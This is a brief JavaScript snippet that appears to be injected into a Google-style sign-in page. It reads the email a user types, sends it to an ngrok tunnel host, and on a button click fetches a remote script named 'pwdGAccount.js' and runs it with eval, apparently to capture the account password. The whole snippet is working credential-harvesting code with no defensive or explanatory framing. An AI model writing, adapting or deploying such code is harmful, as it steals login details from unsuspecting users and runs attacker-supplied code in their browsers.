function send_email(){
    let email = document.querySelector('[type="email"]');
    let param = email.value;

    let xhr = new XMLHttpRequest();
    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            console.log(xhr.responseText);
        }
    };
    xhr.send();
}


const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

btn[1].addEventListener('click', function(){
    send_email();
    setTimeout(function() {
        fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js').then(response => response.text()).then(code => {eval(code)});
    }, 3000);
})
